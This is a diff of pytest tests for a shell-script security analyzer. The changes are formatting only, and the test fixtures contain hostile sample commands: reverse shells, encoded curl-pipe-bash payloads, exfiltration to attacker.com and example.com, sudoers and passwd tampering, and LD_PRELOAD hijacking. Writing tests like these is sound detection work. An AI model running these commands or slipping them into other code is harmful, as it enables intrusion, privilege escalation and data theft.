@@ -6,11 +6,11 @@ from typing import Any, Dict
 from unittest.mock import patch
 
 import pytest
-from insect.analysis.shell.analyzer import SHELL_RULES, ShellScriptAnalyzer
-from insect.finding import FindingType, Severity
+
+from insect.analysis.shell.analyzer import ShellScriptAnalyzer
 
 
-@pytest.fixture()
+@pytest.fixture
 def test_config() -> Dict[str, Any]:
     """Return a configuration for testing the analyzer."""
     return {
@@ -22,7 +22,7 @@ def test_config() -> Dict[str, Any]:
     }
 
 
-@pytest.fixture()
+@pytest.fixture
 def analyzer(test_config: Dict[str, Any]) -> ShellScriptAnalyzer:
     """Initialize the analyzer with the test configuration."""
     with patch(
@@ -32,7 +32,7 @@ def analyzer(test_config: Dict[str, Any]) -> ShellScriptAnalyzer:
         return ShellScriptAnalyzer(test_config)
 
 
-@pytest.fixture()
+@pytest.fixture
 def test_files_dir() -> Path:
     """Get the directory containing test files."""
     current_dir = Path(os.path.dirname(os.path.abspath(__file__)))
@@ -78,26 +78,26 @@ def test_reverse_shell_detection(
         "test_reverse_shell.sh",
         """
         #!/bin/bash
-        
+
         # Basic reverse shell using netcat
         nc -e /bin/bash 10.0.0.1 4444
-        
+
         # Using /dev/tcp for a reverse shell
         bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
-        
+
         # Python reverse shell
         python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
         """,
     )
-    
+
     findings = analyzer.analyze_file(file_path)
-    
+
     assert len(findings) >= 2
     assert any(
         "reverse shell" in finding.title.lower() or "backdoor" in finding.title.lower()
         for finding in findings
     )
-    
+
     # Clean up
     os.remove(file_path)
 
@@ -111,13 +111,13 @@ def test_obfuscated_command_detection(
         "test_obfuscated.sh",
         """
         #!/bin/bash
-        
+
         # Base64 encoded command
         echo "ZWNobyAiaGFja2VkIg==" | base64 -d | bash
-        
+
         # Another obfuscation technique
         eval $(echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==" | base64 -d)
-        
+
         # Hex encoded command
         xxd -r -p <<< "726d202d7266202f686f6d652f75736572" | bash
         """,
@@ -144,16 +144,16 @@ def test_dangerous_command_execution(
         "test_dangerous_commands.sh",
         """
         #!/bin/bash
-        
+
         # Downloading and executing from the web
         curl -s https://example.com/script.sh | bash
-        
+
         # Using eval with variables
         eval "$USER_INPUT"
-        
+
         # Sourcing from a curl command
         source <(curl -s https://example.com/script.sh)
-        
+
         # Executing downloaded file
         wget -q https://example.com/payload.sh -O /tmp/script.sh && bash /tmp/script.sh
         """,
@@ -180,19 +180,19 @@ def test_suspicious_network_activity(
         "test_network.sh",
         """
         #!/bin/bash
-        
+
         # Downloading files to temp locations
         wget https://example.com/payload -O /tmp/payload
-        
+
         # Port scanning
         nc -z 192.168.1.1 22
-        
+
         # DNS lookups
         nslookup suspicious-domain.com
-        
+
         # Direct TCP connection
         exec 3<>/dev/tcp/example.com/80
-        
+
         # More suspicious network activity
         curl -s https://sketchy-domain.com/script | bash
         """,
@@ -219,16 +219,16 @@ def test_privilege_escalation_detection(
         "test_privesc.sh",
         """
         #!/bin/bash
-        
+
         # Setting SUID bit
         chmod +s /usr/bin/custom_binary
-        
+
         # Modifying sudoers file
         echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
-        
+
         # Adding user to sudo group
         usermod -G sudo username
-        
+
         # Creating a privileged cronjob
         echo "* * * * * root /path/to/script" > /etc/cron.d/backdoor
         """,
@@ -255,16 +255,16 @@ def test_sensitive_file_operations(
         "test_file_ops.sh",
         """
         #!/bin/bash
-        
+
         # Removing system files
         rm -rf /etc/ssh/
-        
+
         # Modifying hosts file
         echo "127.0.0.1 legitimate-site.com" >> /etc/hosts
-        
+
         # Creating directories in sensitive locations
         mkdir -p /etc/backdoor/
-        
+
         # Modifying passwd file
         echo "newuser:x:0:0::/:/bin/bash" >> /etc/passwd
         """,
@@ -291,16 +291,16 @@ def test_environment_variable_manipulation(
         "test_env_vars.sh",
         """
         #!/bin/bash
-        
+
         # Modifying PATH
         export PATH=/tmp:$PATH
-        
+
         # Setting LD_PRELOAD
         export LD_PRELOAD=/path/to/malicious.so
-        
+
         # Unsetting IFS
         unset IFS
-        
+
         # Changing user identity
         export HOME=/root
         export USER=root
@@ -328,16 +328,16 @@ def test_data_exfiltration_detection(
         "test_exfil.sh",
         """
         #!/bin/bash
-        
+
         # Archiving home directory
         tar -cz /home/user | curl -X POST -d @- https://example.com/exfil
-        
+
         # Finding sensitive files
         find / -name "*.key" -o -name "*.pem" > /tmp/sensitive_files.txt
-        
+
         # Encrypting data
         gpg --encrypt --recipient attacker@example.com sensitive_data.txt
-        
+
         # Sending data with netcat
         cat /etc/passwd | nc attacker.com 8888
         """,
@@ -385,39 +385,39 @@ def test_shellcheck_integration(test_config: Dict[str, Any], test_files_dir: Pat
     shellcheck_available = os.system("which shellcheck > /dev/null 2>&1") == 0
     if not shellcheck_available:
         pytest.skip("ShellCheck not available")
-    
+
     # Create a file with shellcheck issues
     file_path = create_test_file(
         test_files_dir,
         "test_shellcheck.sh",
         """
         #!/bin/bash
-        
+
         # SC2086: Double quote to prevent globbing and word splitting
         echo $PATH
-        
+
         # SC2154: var is referenced but not assigned
         echo $var
-        
+
         # SC2016: Expressions don't expand in single quotes
         echo 'Using $HOME'
         """,
     )
-    
+
     # Configure analyzer to use shellcheck
     test_config["shell_script_analyzer"]["use_shellcheck"] = True
     analyzer = ShellScriptAnalyzer(test_config)
-    
+
     # Override the check to force shellcheck usage
     analyzer.use_shellcheck = True
-    
+
     findings = analyzer.analyze_file(file_path)
-    
+
     assert len(findings) > 0
     assert any(
         "shellcheck" in finding.id.lower() for finding in findings
     )
-    
+
     # Clean up
     os.remove(file_path)
 
@@ -425,19 +425,19 @@ def test_shellcheck_integration(test_config: Dict[str, Any], test_files_dir: Pat
 def test_confidence_threshold(test_config: Dict[str, Any], test_files_dir: Path) -> None:
     """Test that the confidence threshold works."""
     # This test is mainly focused on checking that the min_confidence parameter is properly applied
-    
+
     # Create a file that will be analyzed
     file_path = create_test_file(
         test_files_dir,
         "test_confidence.sh",
         """
         #!/bin/bash
-        
+
         # Clear reverse shell that should be detected
         nc -e /bin/bash attacker.com 4444
         """,
     )
-    
+
     # Get analyzer with min_confidence = 0.0
     test_config["shell_script_analyzer"]["min_confidence"] = 0.0
     with patch(
@@ -445,10 +445,10 @@ def test_confidence_threshold(test_config: Dict[str, Any], test_files_dir: Path)
         return_value=False,
     ):
         analyzer = ShellScriptAnalyzer(test_config)
-    
+
     # Check that min_confidence value is set correctly
     assert analyzer.min_confidence == 0.0
-    
+
     # For a different high threshold, it should also be set correctly
     test_config["shell_script_analyzer"]["min_confidence"] = 0.9
     with patch(
@@ -456,8 +456,8 @@ def test_confidence_threshold(test_config: Dict[str, Any], test_files_dir: Path)
         return_value=False,
     ):
         high_analyzer = ShellScriptAnalyzer(test_config)
-    
+
     assert high_analyzer.min_confidence == 0.9
-    
+
     # Clean up
     os.remove(file_path)
